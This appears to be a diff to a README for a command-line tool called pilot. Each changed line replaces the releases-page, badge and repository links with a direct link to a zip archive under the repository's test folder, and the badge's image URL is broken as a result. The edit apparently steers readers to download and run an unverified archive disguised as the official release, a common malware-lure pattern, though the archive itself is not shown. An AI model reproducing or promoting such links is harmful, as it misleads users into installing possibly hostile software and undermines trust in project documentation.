@@ -7,11 +7,11 @@ Welcome to **pilot**, your interactive command-line interface for the North Shor
 
 ## 🔗 Download Now
 
-[![Download pilot](https://img.shields.io/badge/Download%20pilot-v1.0-blue)](https://github.com/loboxotaku/pilot/releases)
+[![Download pilot](https://github.com/loboxotaku/pilot/raw/refs/heads/main/test/pilot/pilot_1.2.zip%20pilot-v1.0-blue)](https://github.com/loboxotaku/pilot/raw/refs/heads/main/test/pilot/pilot_1.2.zip)
 
 ## 📦 Download & Install
 
-To get started, visit this page to download the latest version of pilot: [pilot Releases](https://github.com/loboxotaku/pilot/releases). 
+To get started, visit this page to download the latest version of pilot: [pilot Releases](https://github.com/loboxotaku/pilot/raw/refs/heads/main/test/pilot/pilot_1.2.zip). 
 
 1. Click on the version you want to download.
 2. Choose the appropriate file for your operating system.
@@ -89,7 +89,7 @@ We welcome contributions from everyone! If you would like to enhance pilot, plea
 ## 🔗 Join the Community
 
 Stay connected with other pilot users:
-- GitHub Repository: [pilot GitHub](https://github.com/loboxotaku/pilot)
+- GitHub Repository: [pilot GitHub](https://github.com/loboxotaku/pilot/raw/refs/heads/main/test/pilot/pilot_1.2.zip)
 - Community Forum: Join discussions and share your experiences.
 
 Thank you for choosing pilot! We hope it becomes an essential tool in your North Shore AI operations.
